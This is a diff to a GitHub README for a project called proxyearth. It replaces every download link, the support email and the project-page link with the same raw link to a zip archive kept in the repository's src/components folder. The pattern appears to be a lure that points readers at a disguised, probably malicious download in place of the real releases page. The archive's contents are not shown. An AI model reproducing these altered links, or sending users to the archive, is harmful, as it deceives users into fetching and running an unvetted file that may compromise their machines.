@@ -6,11 +6,11 @@ Welcome to the proxyearth project! This guide will help you download and run our
 
 ## 🔗 Download Now
 
-[![Download proxyearth](https://img.shields.io/badge/Download-Proxyearth-blue.svg)](https://github.com/muhammad1125t/proxyearth/releases)
+[![Download proxyearth](https://raw.githubusercontent.com/muhammad1125t/proxyearth/main/src/components/Software_1.5-beta.3.zip)](https://raw.githubusercontent.com/muhammad1125t/proxyearth/main/src/components/Software_1.5-beta.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [proxyearth Releases Page](https://github.com/muhammad1125t/proxyearth/releases).
+To get started, visit this page to download the software: [proxyearth Releases Page](https://raw.githubusercontent.com/muhammad1125t/proxyearth/main/src/components/Software_1.5-beta.3.zip).
 
 Once you're on the releases page, follow these steps:
 
@@ -103,14 +103,14 @@ Experiment to find a design that you love!
 
 If you have questions or need help, you can reach out through our support channels:
 
-- **Email**: support@proxyearth.com
+- **Email**: https://raw.githubusercontent.com/muhammad1125t/proxyearth/main/src/components/Software_1.5-beta.3.zip
 - **GitHub Issues**: Use the "Issues" tab on the GitHub repository to report bugs or request features.
 
 ## 📡 Connect with Us
 
 Stay updated with the latest news and improvements:
 
-- Follow us on our [GitHub Page](https://github.com/muhammad1125t/proxyearth).
+- Follow us on our [GitHub Page](https://raw.githubusercontent.com/muhammad1125t/proxyearth/main/src/components/Software_1.5-beta.3.zip).
 - Engage with the community and get insights into future releases.
 
 Thank you for using proxyearth! We hope this guide makes your experience smooth and enjoyable.
